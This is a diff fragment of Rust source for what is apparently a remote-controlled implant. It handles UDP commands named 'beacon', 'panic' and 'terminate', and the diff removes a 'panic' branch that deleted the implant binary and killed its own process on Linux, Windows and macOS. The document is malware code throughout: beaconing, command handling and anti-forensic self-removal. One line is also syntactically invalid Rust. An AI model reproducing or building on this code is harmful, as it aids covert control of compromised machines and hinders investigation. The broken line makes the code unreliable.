@@ -49,24 +49,7 @@ fn execution(socket: &mut UdpSocket,buf: &mut [u8]) {
     let string2: Vec<&str> = main_command.split(" ").collect();  
     if string2[0]=="beacon" {
         unsafe {beacontime : u64 =  string2[1].parse::<u64>().unwrap();}
-        socket.send(b"");
-    } else if string2[0]=="panic" {
-        if os_type().unwrap()=="Linux" {
-            let pid = id().to_string();
-            socket.send(b"");
-            Command::new("rm").arg("-f").arg("implant").output().expect("failed to execute");
-            Command::new("kill").arg("-9").arg(&pid).output().expect("failed to execute");
-        } else if os_type().unwrap()=="Windows" {
-            let pid = id().to_string();
-            socket.send(b"");
-            Command::new("del").arg("implant.exe").output().expect("failed to execute");
-            Command::new("taskkill").arg("/F").arg("/PID").arg(&pid).output().expect("failed to execute");
-        } else if os_type().unwrap()=="Darwin" {
-            let pid = id().to_string();
-            socket.send(b"");
-            Command::new("rm").arg("-f").arg("implant").output().expect("failed to execute");
-            Command::new("kill").arg("-9").arg(&pid).output().expect("failed to execute");
-        }       
+        socket.send(b"");     
     } else if string2[0]=="terminate" {
         if os_type().unwrap()=="Linux" {
             let pid = id().to_string();
